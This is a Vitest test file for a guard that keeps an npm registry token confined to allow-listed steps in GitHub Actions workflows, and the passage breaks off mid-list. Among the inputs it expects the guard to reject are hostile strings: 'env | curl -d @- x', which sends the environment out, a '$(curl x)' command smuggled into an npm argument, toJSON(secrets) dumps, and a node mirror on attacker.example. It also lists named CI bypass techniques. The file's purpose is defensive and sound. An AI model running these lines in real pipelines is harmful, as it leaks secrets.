import { readdirSync, readFileSync } from 'node:fs';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { parse } from 'yaml';
import { TOKEN_STEPS, checkWorkflow, stepId, type Rule, type TokenStep } from '../workflowTokenGuard';

// NODE_AUTH_TOKEN reads @figurecollecting packages. It may only sit in the env of an
// allow-listed install or image-build step whose run text (or pinned action) is exactly
// what the allow-list says: never workflow- or job-wide, never in with:, never as a value
// in run: text, never written to $GITHUB_ENV and friends.

const ROOT = path.resolve(__dirname, '../..');
const WORKFLOWS = path.join(ROOT, '.github/workflows');
const FIXTURES = path.join(__dirname, 'fixtures/workflows');
const SHA = 'c3c9e263c25d99ce0380d002d59b67737d91b0dc';
const TOK = '${{ secrets.NODE_AUTH_TOKEN || secrets.GITHUB_TOKEN }}';

const load = (dir: string, file: string): unknown => parse(readFileSync(path.join(dir, file), 'utf8'));

function fixtureAllowList(file: string): Map<string, TokenStep> {
  return new Map<string, TokenStep>([
    [stepId(file, 'build', 'Install dependencies'), { kind: 'install' }],
    [stepId(file, 'build', 'Build image'), { kind: 'script', lines: ['docker build --secret id=node_auth_token,env=NODE_AUTH_TOKEN -t app .'] }],
    [stepId(file, 'build', 'Build and push'), { kind: 'action', uses: `docker/build-push-action@${SHA}` }],
    [stepId(file, 'build', 'Fetch the coordinator'), { kind: 'checkout' }],
  ]);
}

function fixture(file: string, allowed: ReadonlyMap<string, TokenStep> = fixtureAllowList(file)): Rule[] {
  return checkWorkflow(file, load(FIXTURES, file), allowed).map((v) => v.rule).sort();
}

/** Rules for an inline workflow; the allow-list is the fixture one, keyed on x.yml. */
function rules(yaml: string): Rule[] {
  return checkWorkflow('x.yml', parse(yaml), fixtureAllowList('x.yml')).map((v) => v.rule).sort();
}

/** One allow-listed step in job build, carrying the token in its env. */
const step = (name: string, body: string, env = `NODE_AUTH_TOKEN: ${TOK}`): string =>
  `jobs:\n  build:\n    steps:\n      - name: ${name}\n${body.replace(/^/gm, '        ')}\n        env:\n          ${env}\n`;
const install = (run: string): Rule[] => rules(step('Install dependencies', `run: ${JSON.stringify(run)}`));
const trivy = (uses: string): Rule[] => rules(`jobs:\n  scan:\n    steps:\n      - uses: ${uses}\n`);

describe('workflow token guard on fixtures', () => {
  it('passes the allowed shapes: install and image-build step env, secret-envs by name, pinned actions', () => {
    expect(fixture('clean.yml')).toEqual([]);
  });

  it('fails on a workflow-level token', () => {
    expect(fixture('workflow-level-token.yml')).toEqual(['workflow-env']);
  });

  it('fails on a job-level token', () => {
    expect(fixture('job-level-token.yml')).toEqual(['job-env']);
  });

  it('fails on the token in with:', () => {
    expect(fixture('token-in-with.yml')).toEqual(['with']);
  });

  it('fails on a GITHUB_ENV export of the token', () => {
    expect(fixture('github-env-export.yml')).toEqual(['github-env']);
  });

  it('fails on the token on a non-install step', () => {
    const violations = checkWorkflow('non-install-step.yml', load(FIXTURES, 'non-install-step.yml'), fixtureAllowList('non-install-step.yml'));
    expect(violations).toEqual([{ file: 'non-install-step.yml', where: 'build > Run unit tests > env', rule: 'non-install-step' }]);
  });

  it('fails on the token value in run: text, even on an allowed step', () => {
    expect(fixture('token-in-run.yml')).toEqual(['run-grammar', 'run-value']);
  });

  it('fails on the token anywhere else (a container env, an if:, the run name)', () => {
    expect(fixture('token-elsewhere.yml')).toEqual(['elsewhere', 'elsewhere', 'elsewhere']);
  });

  it('fails on an npm ci that runs install scripts while the token is in the step env', () => {
    expect(fixture('npm-ci-scripts.yml')).toEqual(['run-grammar']);
  });

  it('fails on aquasecurity/trivy-action referenced by tag or short SHA instead of a full SHA', () => {
    expect(fixture('trivy-tag.yml')).toEqual(['trivy-unpinned', 'trivy-unpinned']);
  });

  it('flags every token-bearing step, and a by-name with:, once the steps are not allow-listed', () => {
    expect(fixture('clean.yml', new Map())).toEqual(['non-install-step', 'non-install-step', 'non-install-step', 'non-install-step', 'with']);
  });

  it('never matches an unnamed step against the allow-list', () => {
    const wf = { jobs: { build: { steps: [{ run: 'npm ci --ignore-scripts', env: { NODE_AUTH_TOKEN: 'x' } }] } } };
    const allowed = new Map<string, TokenStep>(['#0', 'undefined'].map((s) => [stepId('x.yml', 'build', s), { kind: 'install' }]));
    expect(checkWorkflow('x.yml', wf, allowed).map((v) => v.rule)).toEqual(['non-install-step']);
  });

  it('labels an unnamed step by its index', () => {
    const wf = { jobs: { build: { steps: [{ run: 'npm test', env: { NODE_AUTH_TOKEN: 'x' } }] } } };
    expect(checkWorkflow('x.yml', wf, new Map())).toEqual([{ file: 'x.yml', where: 'build > #0 > env', rule: 'non-install-step' }]);
  });

  it('tolerates documents without jobs or steps, and empty keys', () => {
    expect(checkWorkflow('x.yml', null, new Map())).toEqual([]);
    expect(checkWorkflow('x.yml', { jobs: { call: { uses: './other.yml' } } }, new Map())).toEqual([]);
    expect(checkWorkflow('x.yml', { jobs: { build: { steps: [{ name: 'a', with: null, run: 'npm test' }] } } }, new Map())).toEqual([]);
  });
});

// The challenger's bypasses (wk-09b-i1): each one returned [] before this fix.
describe('workflow token guard on adversarial fixtures', () => {
  it.each<[string, Rule[]]>([
    ['a01-lowercase-secret.yml', ['job-env']],
    ['a02-tojson-secrets.yml', ['all-secrets']],
    ['a03-env-dump-to-github-env.yml', ['github-env', 'run-grammar']],
    ['a04-npm-ci-semicolon.yml', ['run-grammar']],
    ['a05-ignore-scripts-false.yml', ['run-grammar']],
    ['a06-npm-install.yml', ['run-grammar']],
    ['a07-reused-step-name.yml', ['run-grammar']],
    ['a08-bracket-index-in-with.yml', ['run-grammar', 'token-action', 'with']],
    ['a09-trivy-owner-case.yml', ['trivy-unpinned']],
    ['a10-secrets-inherit.yml', ['job-secrets']],
    ['a11-chained-tests.yml', ['run-grammar']],
    ['a12-npx.yml', ['run-grammar']],
    ['a13-alias-to-github-env.yml', ['env-alias', 'github-env', 'run-grammar']],
    ['c01-control-npm-ci.yml', ['run-grammar']],
    // Round 2 (wk-09b-i1): each one also returned [] before this fix.
    ['b01-step-shell.yml', ['all-env', 'step-key']],
    ['b02-workflow-default-shell.yml', ['workflow-key']],
    ['b03-job-default-shell.yml', ['job-key']],
    ['b04-step-node-options.yml', ['step-env']],
    ['b05-step-bash-env.yml', ['step-env']],
    ['b06-job-node-options.yml', ['scope-env']],
    ['b07-earlier-github-env.yml', ['github-env', 'step-order']],
    ['b08-earlier-github-path.yml', ['github-env', 'step-order']],
    ['b09-tojson-paren-secrets.yml', ['all-secrets']],
    ['b10-join-secrets-star.yml', ['all-secrets']],
    ['b11-tojson-secrets-star.yml', ['all-secrets']],
    ['b12-secrets-spaced-index.yml', ['all-secrets']],
    ['b13-step-working-directory.yml', ['step-key']],
    ['b14-container-job.yml', ['job-key']],
    ['b15-job-coordinator-repo.yml', ['scope-env']],
    ['b16-workflow-bash-func.yml', ['scope-env']],
    ['b17-env-index-in-with.yml', ['all-env']],
    ['b18-tojson-env-in-with.yml', ['all-env']],
    ['b19-indirect-github-env.yml', ['step-order']],
    ['b20-earlier-github-script.yml', ['step-order']],
    // Round 3 (wk-09b-i2): each one returned [] or another rule before this fix.
    ['d01-reusable-pass-token.yml', ['job-secrets']],
    ['d02-reusable-tojson-secrets.yml', ['job-secrets']],
    ['d03-reusable-token-other-name.yml', ['job-secrets']],
    ['d04-step-env-expression.yml', ['env-expr']],
    ['d05-job-env-expression.yml', ['env-expr']],
    ['d06-workflow-env-expression.yml', ['env-expr']],
    ['d07-env-expression-builds-token-name.yml', ['env-expr']],
    ['d08-setup-node-mirror.yml', ['setup-with']],
    ['d09-setup-node-registry.yml', ['setup-with']],
    ['d10-checkout-other-repo.yml', ['setup-with']],
    ['d11-setup-buildx-remote.yml', ['setup-with']],
    ['d12-setup-node-version-file.yml', ['setup-with']],
    ['d13-setup-with-expression.yml', ['setup-with']],
    ['d14-setup-step-env.yml', ['setup-with']],
    // wk-09b-i2: D1 the checkout line on a plain install entry, D5 a setup action at another
    // commit, D10 the build action at another commit, X18 the pinned script broken across other lines.
    ['e01-checkout-line-in-install.yml', ['run-grammar']],
    ['e02-setup-node-imposter-sha.yml', ['action-pin']],
    ['e03-build-push-any-sha.yml', ['action-pin', 'token-action']],
    ['e04-script-lines-rebroken.yml', ['run-grammar']],
  ])('%s is flagged %j', (file, expected) => {
    expect(fixture(`adversarial/${file}`)).toEqual(expected);
  });

  it('lists a fixture for every case', () => {
    expect(readdirSync(path.join(FIXTURES, 'adversarial')).length).toBe(52);
  });
});

describe('install grammar on allow-listed install steps', () => {
  it.each([
    'npm ci --ignore-scripts',
    'npm --prefix e2e/stack ci --ignore-scripts',
    'npm --prefix ../a_b.c/D-9 ci --ignore-scripts',
    'npm ci --ignore-scripts\n\n  npm --prefix e2e/stack ci --ignore-scripts\n',
    'npm ci --ignore-scripts ',
  ])('accepts %j', (run) => {
    expect(install(run)).toEqual([]);
  });

  it.each([
    'npm ci',
    'npm i',
    'npm install --ignore-scripts',
    'npx vitest run',
    'npm cin --ignore-scripts',
    'xnpm ci --ignore-scripts',
    'npm ci --ignore-scripts-x',
    'npm ci --ignore-scripts=false',
    'npm ci --ignore-scripts; npm test',
    'npm ci --ignore-scripts && npm test',
    'npm ci; curl x --ignore-scripts',
    'npm ci --ignore-scripts | tee log',
    'npm  ci --ignore-scripts',
    'npm --prefix e2e/stack;curl ci --ignore-scripts',
    'npm --prefix $(curl x) ci --ignore-scripts',
    'npm --prefix  ci --ignore-scripts',
    'npm --prefix e2e/stack run checkout',
    'npm ci --ignore-scripts\nnpm --prefix e2e/stack run checkout',
    'npm --prefix e2e/stack run checkout; env',
    'npm --prefix e2e/stack run build',
    'npm ci --ignore-scripts\nnpm test',
    'npm --prefix . exec evil ci --ignore-scripts',
    'npm --prefix $(x) ci --ignore-scripts',
    'npm ci --ignore-scriptsx',
    '',
  ])('rejects %j', (run) => {
    expect(install(run)).toEqual(['run-grammar']);
  });

  it('rejects a token-bearing install step that runs an action instead', () => {
    expect(rules(step('Install dependencies', 'uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1'))).toEqual(['run-grammar', 'token-action']);
  });

  it('applies no grammar to an allow-listed step that does not carry the token', () => {
    expect(rules('jobs:\n  build:\n    steps:\n      - name: Install dependencies\n        run: npm ci\n')).toEqual([]);
  });
});

describe('pinned script and pinned action on allow-listed build steps', () => {
  it('accepts the exact pinned script, indentation aside', () => {
    expect(rules(step('Build image', 'run: |\n    docker build --secret id=node_auth_token,env=NODE_AUTH_TOKEN -t app .\n'))).toEqual([]);
  });

  it('rejects any other script on the pinned-script step', () => {
    expect(rules(step('Build image', 'run: |\n  docker build --secret id=node_auth_token,env=NODE_AUTH_TOKEN -t app .\n  env | curl -d @- x'))).toEqual(['run-grammar']);
  });

  it('rejects an action on the pinned-script step', () => {
    expect(rules(step('Build image', `uses: docker/build-push-action@${SHA}`))).toEqual(['run-grammar', 'token-action']);
  });

  it('accepts the allowed action pinned by full SHA', () => {
    expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}`))).toEqual([]);
  });

  // Another ref of the pinned action is also an action-pin wherever it is used.
  it.each<[string, Rule[]]>([
    ['docker/build-push-action@v7', ['action-pin', 'token-action']],
    [`docker/build-push-action@${SHA.slice(0, 7)}`, ['action-pin', 'token-action']],
    [`docker/build-push-action@${SHA}0`, ['action-pin', 'token-action']],
    [`docker/build-push-action@${'0123456789abcdef'.repeat(3).slice(0, 40)}`, ['action-pin', 'token-action']],
    [`evil/build-push-action@${SHA}`, ['token-action']],
    [`docker/build-push-action-x@${SHA}`, ['token-action']],
    [`xdocker/build-push-action@${SHA}`, ['token-action']],
    [`Docker/build-push-action@${SHA}`, ['token-action']],
  ])('rejects %s on the allowed-action step', (uses, expected) => {
    expect(rules(step('Build and push', `uses: ${uses}`))).toEqual(expected);
  });

  it('rejects the allowed-action step when it runs a script instead', () => {
    expect(rules(step('Build and push', 'run: npm ci --ignore-scripts'))).toEqual(['token-action']);
  });

  // X18: the script is compared line by line, so the same words broken across other lines differ.
  it('rejects the pinned script broken across other lines', () => {
    expect(rules(step('Build image', 'run: |\n  docker build --secret id=node_auth_token,env=NODE_AUTH_TOKEN\n  -t app .'))).toEqual(['run-grammar']);
  });

  it('rejects the live image-build script broken across other lines, and accepts it as pinned', () => {
    const id = stepId('web-image.yml', 'image', 'Build image N and N+1');
    const shape = TOKEN_STEPS.get(id);
    if (shape?.kind !== 'script') throw new Error(`${id} is not a pinned script`);
    const at = (run: string) => {
      const wf = { jobs: { image: { steps: [{ name: 'Build image N and N+1', run, env: { NODE_AUTH_TOKEN: TOK } }] } } };
      return checkWorkflow('web-image.yml', wf, TOKEN_STEPS).map((v) => v.rule);
    };
    expect(at(shape.lines.join('\n'))).toEqual([]);
    expect(at(shape.lines.join('\n').replace('set -euo pipefail', 'set -euo\npipefail'))).toEqual(['run-grammar']);
    expect(at(shape.lines.join(' '))).toEqual(['run-grammar']);
  });
});

// D1: only the coordinator entries may run the repo's checkout script; a plain install entry may not.
describe('the coordinator checkout on its own entries', () => {
  const checkout = (run: string): Rule[] => rules(step('Fetch the coordinator', `run: ${JSON.stringify(run)}`));

  it.each(['npm --prefix e2e/stack run checkout', 'npm --prefix e2e/stack ci --ignore-scripts\nnpm --prefix e2e/stack run checkout', 'npm ci --ignore-scripts'])(
    'accepts %j on a checkout entry',
    (run) => {
      expect(checkout(run)).toEqual([]);
    },
  );

  it.each(['npm --prefix e2e/stack run checkout; env', 'npm --prefix e2e/stack run build', 'npm run checkout', 'npm --prefix e2e/stack run checkout\nnpm test', ''])(
    'rejects %j on a checkout entry',
    (run) => {
      expect(checkout(run)).toEqual(['run-grammar']);
    },
  );

  it('binds the checkout kind to the two coordinator entries of the live allow-list', () => {
    const ids = [...TOKEN_STEPS].filter(([, s]) => s.kind === 'checkout').map(([id]) => id);
    expect(ids).toEqual([
      stepId('stack.yml', 'stack', 'Fetch and install the pinned coordinator'),
      stepId('web-image.yml', 'image', 'Install harness dependencies and the pinned coordinator'),
    ]);
  });

  it('flags the checkout line appended to the build.yml install step', () => {
    const wf = parse(step('Install dependencies', 'run: |\n  npm ci --ignore-scripts\n  npm --prefix e2e/stack run checkout'));
    expect(checkWorkflow('build.yml', wf, TOKEN_STEPS)).toEqual([{ file: 'build.yml', where: 'build > Install dependencies > run', rule: 'run-grammar' }]);
  });
});

describe('token references, case-insensitive', () => {
  it.each([
    '${{ secrets.NODE_AUTH_TOKEN }}',
    '${{ secrets.node_auth_token }}',
    '${{ SECRETS.Node_Auth_Token }}',
    "${{ secrets['NODE_AUTH_TOKEN'] }}",
    "${{ secrets[ 'node_auth_token' ] }}",
    '${{ env.NODE_AUTH_TOKEN }}',
    '${{ env.node_auth_token }}',
    "${{ env['NODE_AUTH_TOKEN'] }}",
  ])('flags %s in with: even on the allowed-action step', (ref) => {
    expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  token: ${JSON.stringify(ref)}`))).toEqual(['with']);
  });

  it.each(['echo $NODE_AUTH_TOKEN', 'echo ${NODE_AUTH_TOKEN}', 'echo $node_auth_token', 'echo ${{ secrets.NODE_AUTH_TOKEN }}'])(
    'flags %j as a value in run: text on a step without the token',
    (run) => {
      expect(rules(`jobs:\n  test:\n    steps:\n      - run: ${JSON.stringify(run)}\n`)).toEqual(['run-value']);
    },
  );

  it('flags a plain mention of the name in run: text on a step without the token', () => {
    expect(rules('jobs:\n  test:\n    steps:\n      - run: printenv NODE_AUTH_TOKEN\n')).toEqual(['non-install-step']);
  });

  it('flags a lower-case token key in a workflow env', () => {
    expect(rules(`env:\n  node_auth_token: x\njobs: {}\n`)).toEqual(['workflow-env']);
  });


  it('flags the token under a second env name on an allowed step', () => {
    expect(install('npm ci --ignore-scripts')).toEqual([]);
    expect(rules(step('Install dependencies', 'run: npm ci --ignore-scripts', `NODE_AUTH_TOKEN: ${TOK}\n          node_auth_token: ${TOK}`))).toEqual(['env-alias']);
  });
});

describe('every secret at once', () => {
  it.each([
    ['workflow env', 'env:\n  ALL: ${{ toJSON(secrets) }}\njobs: {}\n'],
    ['run text', "jobs:\n  b:\n    steps:\n      - run: echo '${{ TOJSON( secrets ) }}'\n"],
    ['a dynamic index', 'jobs:\n  b:\n    steps:\n      - run: echo ${{ secrets[matrix.name] }}\n'],
    ['a spaced dynamic index', "jobs:\n  b:\n    steps:\n      - run: echo ${{ secrets[ format('{0}', matrix.name) ] }}\n"],
  ])('flags toJSON(secrets) or a computed secrets[] in %s', (_where, yaml) => {
    expect(rules(yaml)).toEqual(['all-secrets']);
  });

  it.each(['inherit', 'Inherit', '${{ toJSON(secrets) }}', '[KEY]'])('flags secrets: %s on a reusable-workflow job', (value) => {
    expect(checkWorkflow('x.yml', parse(`jobs:\n  call:\n    uses: ./other.yml\n    secrets: ${value}\n`), new Map())).toEqual([
      { file: 'x.yml', where: 'call > secrets', rule: 'job-secrets' },
    ]);
  });

  it.each([
    'NODE_AUTH_TOKEN: ${{ secrets.NODE_AUTH_TOKEN }}',
    'node_auth_token: ${{ secrets.KEY }}',
    'PAT: ${{ secrets.node_auth_token }}',
    'ALL: ${{ toJSON(secrets) }}',
    'ALL: ${{ join(secrets.*, \',\') }}',
    "KEY: ${{ secrets[matrix.name] }}",
  ])('flags %s passed to a reusable workflow, once', (entry) => {
    expect(checkWorkflow('x.yml', parse(`jobs:\n  call:\n    uses: ./other.yml\n    secrets:\n      ${entry}\n`), new Map())).toEqual([
      { file: 'x.yml', where: 'call > secrets', rule: 'job-secrets' },
    ]);
  });

  it('accepts an empty secrets: on a reusable-workflow job, and reads values, not keys', () => {
    expect(rules('jobs:\n  call:\n    uses: ./other.yml\n    secrets:\n')).toEqual([]);
    expect(rules('jobs:\n  call:\n    uses: ./other.yml\n    secrets:\n      secrets: ${{ secrets.KEY }}\n')).toEqual([]);
  });

  it('accepts a reusable-workflow job that passes a named, unrelated secret', () => {
    expect(rules('jobs:\n  call:\n    uses: ./other.yml\n    secrets:\n      KEY: ${{ secrets.KEY }}\n')).toEqual([]);
  });
});

describe('runner-file writes on a token-bearing step', () => {
  it.each(['GITHUB_ENV', 'GITHUB_OUTPUT', 'GITHUB_STATE', 'GITHUB_PATH'])('flags a write to $%s that never names the token', (file) => {
    expect(install(`npm ci --ignore-scripts\necho "x=1" >> "$${file}"`)).toEqual(['github-env', 'run-grammar']);
  });

  it.each(['::set-output name=x::1', '::save-state name=x::1', '::set-env name=x::1', '::add-path::/x'])('flags the %s workflow command', (cmd) => {
    expect(install(`npm ci --ignore-scripts\necho "${cmd}"`)).toEqual(['github-env', 'run-grammar']);
  });

  it.each(['>> "$GITHUB_OUTPUT"', '>> "$GITHUB_ENV"', '>> "$GITHUB_STATE"', '>> "$GITHUB_PATH"', '"::set-output name=t::"', '"::save-state name=t::"', '"::set-env name=t::"', '"::add-path::"'])(
    'flags a runner-file write (%s) that names the token in a job without a token step',
    (sink) => {
      expect(rules(`jobs:\n  b:\n    steps:\n      - run: echo NODE_AUTH_TOKEN ${sink}\n`)).toEqual(['github-env']);
    },
  );

  it('leaves a $GITHUB_OUTPUT write alone on a step without the token', () => {
    expect(rules('jobs:\n  b:\n    steps:\n      - run: echo "v=1" >> "$GITHUB_OUTPUT"\n')).toEqual([]);
  });
});

describe('trivy pin', () => {
  it.each([
    `aquasecurity/trivy-action@${SHA}0`,
    `aquasecurity/trivy-action@${SHA}-x`,
    `aquasecurity/trivy-action@v${SHA}`,
    `aquasecurity/trivy-action@${'z'.repeat(40)}`,
    'AQUASECURITY/setup-trivy@v0.2.0',
  ])('flags %s', (uses) => {
    expect(trivy(uses)).toEqual(['trivy-unpinned']);
  });

  it('accepts a full SHA', () => {
    expect(trivy(`aquasecurity/trivy-action@${SHA}`)).toEqual([]);
  });
});

/** A job holding the allowed token install step, with extra job keys and steps before it. */
const TOKEN_INSTALL = `      - name: Install dependencies\n        run: npm ci --ignore-scripts\n        env:\n          NODE_AUTH_TOKEN: ${TOK}\n`;
const tokenJob = (keys = '', before = ''): string => `jobs:\n  build:\n    runs-on: ubuntu-latest\n${keys}    steps:\n${before}${TOKEN_INSTALL}`;

describe('what may change how a token step runs', () => {
  it.each(['id: install', "if: github.event_name == 'push'", 'continue-on-error: true'])('accepts %s on the token step', (key) => {
    expect(rules(step('Install dependencies', `run: npm ci --ignore-scripts\n${key}`))).toEqual([]);
  });

  it.each(['shell: sh', 'working-directory: e2e/stack', 'timeout-minutes: 5'])('flags %s on the token step', (key) => {
    const violations = checkWorkflow('x.yml', parse(step('Install dependencies', `run: npm ci --ignore-scripts\n${key}`)), fixtureAllowList('x.yml'));
    expect(violations).toEqual([{ file: 'x.yml', where: `build > Install dependencies > ${key.split(':')[0]}`, rule: 'step-key' }]);
  });

  it('accepts any value under the token name on an allowed step', () => {
    expect(rules(step('Install dependencies', 'run: npm ci --ignore-scripts', 'NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}'))).toEqual([]);
  });

  it('flags every key but the token in a token step env, and names the step', () => {
    const violations = checkWorkflow('x.yml', parse(step('Install dependencies', 'run: npm ci --ignore-scripts', `NODE_AUTH_TOKEN: ${TOK}\n          CI: 'true'`)), fixtureAllowList('x.yml'));
    expect(violations).toEqual([{ file: 'x.yml', where: 'build > Install dependencies > env', rule: 'step-env' }]);
  });

  it('accepts the job keys the live workflows use', () => {
    const keys = "    name: Build\n    if: github.event_name == 'push'\n    needs: [lint]\n    permissions:\n      contents: read\n    strategy:\n      matrix:\n        node: ['24']\n    timeout-minutes: 25\n    outputs:\n      digest: x\n";
    expect(rules(tokenJob(keys))).toEqual([]);
  });

  it.each(['services', 'defaults', 'container'])('flags %s on a job that holds a token step', (key) => {
    const violations = checkWorkflow('x.yml', parse(tokenJob(`    ${key}:\n      x: y\n`)), fixtureAllowList('x.yml'));
    expect(violations).toEqual([{ file: 'x.yml', where: `build > ${key}`, rule: 'job-key' }]);
  });

  it('leaves the keys of a job without a token step alone', () => {
    expect(rules('defaults:\n  run:\n    shell: sh\njobs:\n  t:\n    container: node:24\n    defaults:\n      run:\n        shell: sh\n    steps:\n      - run: npm test\n')).toEqual([]);
  });

  it('accepts the standard workflow keys next to a token job, and flags defaults', () => {
    const head = "name: x\nrun-name: x\non: [push]\npermissions:\n  contents: read\nconcurrency: x\n";
    expect(rules(head + tokenJob())).toEqual([]);
    expect(checkWorkflow('x.yml', parse(`defaults:\n  run:\n    shell: sh\n${tokenJob()}`), fixtureAllowList('x.yml'))).toEqual([
      { file: 'x.yml', where: 'defaults', rule: 'workflow-key' },
    ]);
  });

  it('accepts the allow-listed image names in the job and workflow env of a token job', () => {
    expect(rules(`env:\n  FC_STACK_WEB_IMAGE: a\n${tokenJob('    env:\n      FC_WEB_IMAGE: a\n      FC_WEB_IMAGE_NEXT: b\n')}`)).toEqual([]);
  });

  it.each(['NODE_OPTIONS', 'BASH_ENV', 'ENV', 'PATH', 'LD_PRELOAD', 'npm_config_registry', 'NPM_CONFIG_USERCONFIG', 'FC_COORDINATOR_REF', 'fc_web_image', 'SHELLOPTS'])(
    'flags %s in the env of a job that holds a token step, and in its workflow env',
    (name) => {
      expect(checkWorkflow('x.yml', parse(tokenJob(`    env:\n      ${name}: x\n`)), fixtureAllowList('x.yml'))).toEqual([
        { file: 'x.yml', where: 'build > env', rule: 'scope-env' },
      ]);
      expect(checkWorkflow('x.yml', parse(`env:\n  ${name}: x\n${tokenJob()}`), fixtureAllowList('x.yml'))).toEqual([
        { file: 'x.yml', where: 'env', rule: 'scope-env' },
      ]);
    },
  );

  it.each(["'${{ fromJSON(vars.ENV) }}'", '[A=1]', '5'])('flags env: %s at workflow, job and step level, token or not', (env) => {
    const at = (where: string) => ({ file: 'x.yml', where, rule: 'env-expr' });
    expect(checkWorkflow('x.yml', parse(`env: ${env}\njobs:\n  t:\n    env: ${env}\n    steps:\n      - name: Test\n        run: npm test\n        env: ${env}\n`), new Map())).toEqual([
      at('env'),
      at('t > env'),
      at('t > Test > env'),
    ]);
  });

  it('flags a token step whose env is one expression, and names the step', () => {
    const yaml = `jobs:\n  build:\n    steps:\n      - name: Install dependencies\n        run: npm ci --ignore-scripts\n        env: \${{ fromJSON(format('{{"NODE_AUTH_TOKEN":"{0}"}}', secrets.NODE_AUTH_TOKEN)) }}\n`;
    expect(checkWorkflow('x.yml', parse(yaml), fixtureAllowList('x.yml'))).toEqual([
      { file: 'x.yml', where: 'build > Install dependencies > env', rule: 'env-expr' },
    ]);
  });

  it('accepts an empty env at every level', () => {
    expect(rules(`env:\n${tokenJob('    env:\n')}`)).toEqual([]);
    expect(rules('jobs:\n  t:\n    steps:\n      - run: npm test\n        env:\n')).toEqual([]);
  });

  it('flags one stray name next to the allowed ones', () => {
    expect(rules(tokenJob('    env:\n      FC_WEB_IMAGE: a\n      NODE_OPTIONS: x\n'))).toEqual(['scope-env']);
  });

  it('leaves the env of a workflow or job without a token step alone', () => {
    expect(rules('env:\n  NODE_OPTIONS: x\njobs:\n  t:\n    env:\n      NODE_OPTIONS: x\n    steps:\n      - run: npm test\n')).toEqual([]);
    expect(rules(`${tokenJob()}  t:\n    env:\n      NODE_OPTIONS: x\n    steps:\n      - run: npm test\n`)).toEqual([]);
  });

  it.each(['echo "A=1" >> "$GITHUB_ENV"', 'echo /x >> $GITHUB_PATH', 'echo "::set-env name=A::1"', 'echo "::add-path::/x"'])(
    'flags %j on any step of a job that holds a token step, before or after it',
    (run) => {
      const other = `      - name: Other\n        run: ${JSON.stringify(run)}\n`;
      const want = { file: 'x.yml', where: 'build > Other > run', rule: 'github-env' };
      expect(checkWorkflow('x.yml', parse(tokenJob() + other), fixtureAllowList('x.yml'))).toEqual([want]);
      expect(checkWorkflow('x.yml', parse(tokenJob('', other)), fixtureAllowList('x.yml'))).toEqual([
        want,
        { file: 'x.yml', where: 'build > Other > step', rule: 'step-order' },
      ]);
    },
  );

  it.each(['echo v=1 >> "$GITHUB_OUTPUT"', 'echo ok >> "$GITHUB_STEP_SUMMARY"', 'echo s=1 >> "$GITHUB_STATE"'])(
    'leaves %j alone on another step of a token job',
    (run) => {
      expect(rules(`${tokenJob()}      - run: ${JSON.stringify(run)}\n`)).toEqual([]);
    },
  );

  it('accepts the setup actions before the token steps, and untokened steps after the last one', () => {
    const before = ['actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1', 'actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069', 'docker/metadata-action@dc802804100637a589fabce1cb79ff13a1411302', 'Docker/Login-Action@dbcb813823bdd20940b903addbd779551569679f']
      .map((u) => `      - uses: ${u}\n`)
      .join('');
    expect(rules(`${tokenJob('', before)}      - run: npm test\n      - uses: evil/action@v1\n`)).toEqual([]);
  });

  it.each(['run: npm run build', 'uses: ./.github/actions/local', 'uses: docker://evil/image', 'uses: actions/github-script@v8', 'uses: evil/checkout@v7', 'uses: actions/checkout-x@v7', 'uses: xactions/checkout@v7', 'uses: actions/checkout', 'uses: evil/login-action@v4', 'uses: docker/login-action-x@v4'])(
    'flags %s before a token step',
    (body) => {
      expect(checkWorkflow('x.yml', parse(tokenJob('', `      - ${body}\n`)), fixtureAllowList('x.yml'))).toEqual([
        { file: 'x.yml', where: 'build > #0 > step', rule: 'step-order' },
      ]);
    },
  );

  it('accepts the with: inputs the live workflows give the setup actions', () => {
    const before = [
      "actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1\n        with:\n          node-version: '24'\n          cache: 'npm'\n          cache-dependency-path: |\n            package-lock.json\n            e2e/stack/package-lock.json",
      'actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1\n        with:\n          node-version: ${{ matrix.node-version }}\n          registry-url: https://npm.pkg.github.com',
      'actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1\n        with:\n          node-version: 24\n        env:',
      'docker/metadata-action@dc802804100637a589fabce1cb79ff13a1411302\n        with:\n          images: ghcr.io/figurecollecting/fc-mobile-web\n          tags: |\n            type=sha,format=short,prefix=sha-',
      'docker/login-action@dbcb813823bdd20940b903addbd779551569679f\n        with:\n          registry: ghcr.io\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}',
      'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n        with:',
    ]
      .map((u) => `      - uses: ${u}\n`)
      .join('');
    expect(rules(tokenJob('', before))).toEqual([]);
  });

  it.each([
    ['actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1', 'repository: attacker/fc-mobile'],
    ['actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1', 'ref: main'],
    ['actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1', 'path: e2e/stack'],
    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'mirror: https://attacker.example/node'],
    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'node-version-file: .nvmrc'],
    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'registry-url: https://npm.pkg.github.com/'],
    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'registry-url: https://registry.npmjs.org'],
    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'node-version: ${{ vars.NODE_VERSION }}'],
    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', "cache: ${{ 'npm' }}"],
    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'cache-dependency-path: ${{ vars.LOCK }}'],
    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'Node-Version: 24'],
    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'constructor: x'],
